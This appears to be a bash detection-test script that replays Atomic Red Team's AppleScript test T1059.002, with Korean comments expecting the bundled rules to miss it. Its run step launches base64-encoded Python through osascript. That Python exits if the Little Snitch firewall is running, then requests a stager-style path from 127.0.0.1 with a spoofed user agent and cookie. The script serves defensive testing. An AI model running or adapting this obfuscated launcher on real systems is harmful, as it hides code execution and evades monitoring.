#!/usr/bin/env bash
# id: A01
# attack: T1059.002
# atomic: Atomic Red Team T1059.002 #1 (AppleScript)
# expect: detected
# rule: NONE
# type: process
# probe: warnings.filterwarnings
# osascript 가 do shell script 로 base64 파이썬을 python 에 흘려 넣는다. 파이썬은 127.0.0.1:80 에만 접속을 시도한다.
# 번들 룰 중 명령행이 맞는 것이 없다(JXA 룰은 -l JavaScript 와 NSData.dataWithContentsOfURL 이 필요). 미탐이 예상이다.
set -euo pipefail
case "${1:?run|cleanup}" in
  run)
    # ART 명령 그대로. 출력은 버린다
    osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\"" >/dev/null 2>&1 || true
    ;;
  cleanup)
    : # 남기는 것이 없다
    ;;
esac
